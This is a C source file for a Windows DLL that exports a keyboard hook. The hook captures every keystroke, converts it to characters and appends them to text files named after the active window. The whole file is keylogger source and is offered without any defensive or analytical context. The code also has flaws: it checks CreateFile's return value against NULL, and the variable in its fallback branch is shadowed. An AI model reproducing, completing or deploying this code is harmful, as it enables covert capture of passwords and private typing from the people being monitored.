#include <windows.h>
#include <ctype.h>
#include <shlwapi.h>

#define n 10
#define reserv 500
#define wndTextMaxLen 300
WCHAR strBuf[n + reserv];
WCHAR fileName[wndTextMaxLen];
BYTE keyStates[256];
BOOL isFirstEnter = true;
int i;

int WriteToFile(LPCVOID buf, int len);

__declspec(dllexport)
LRESULT CALLBACK KeyboardProc(int		code,
							  WPARAM	wParam,
							  LPARAM	lParam)
{
	if (code < 0)
		return CallNextHookEx(
		NULL,
		code,
		wParam,
		lParam);

	if (isFirstEnter)
	{
		isFirstEnter = false;
		HWND hWnd = GetActiveWindow();
		WCHAR fName[wndTextMaxLen];
		GetWindowText(
			hWnd,
			fName,
			wndTextMaxLen);
		StrCat(fileName, L"D:\\output\\");
		StrCat(fileName, fName);
		StrCat(fileName, L".txt");
		//MessageBox(NULL, fileName, fName, MB_OK);
	}

	BYTE keyState = (BYTE)(lParam >> 31);
	BYTE scanCode = (BYTE)(lParam << 8 >> 24);
	keyStates[scanCode] = keyState;
	if (keyState != 0)
	{	
		int toUnicodeRes = ToUnicode(
			(UINT)wParam,
			scanCode,
			keyStates,
			&(strBuf[i]),
			n + reserv - i,
			1);
		i += toUnicodeRes;
		if (i >= n)
		{
			WriteToFile(strBuf, i * sizeof(WCHAR));
			i = 0;
		}
	}

	return CallNextHookEx(
		NULL,
		code,
		wParam,
		lParam);
}
int WriteToFile(LPCVOID buf,
				int len)
{
	HANDLE hFile = CreateFile(
		fileName,
		FILE_ALL_ACCESS,
		NULL,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == NULL)
	{
		StrCpy(fileName, L"D:\\output\\UnknownApplication.txt");
		HANDLE hFile = CreateFile(
			fileName,
			FILE_ALL_ACCESS,
			NULL,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
	}
	if (hFile != NULL)
	{
		DWORD newFilePointer = SetFilePointer(
			hFile,
			0,
			NULL,
			FILE_END);
		DWORD bytesWritten;
		BOOL writeRes = WriteFile(
			hFile,
			buf,
			len,
			&bytesWritten,
			NULL);
		CloseHandle(hFile);
		MessageBox(NULL, L"OK", L"OK", MB_OK);
		return bytesWritten;
	}
	return 0;
}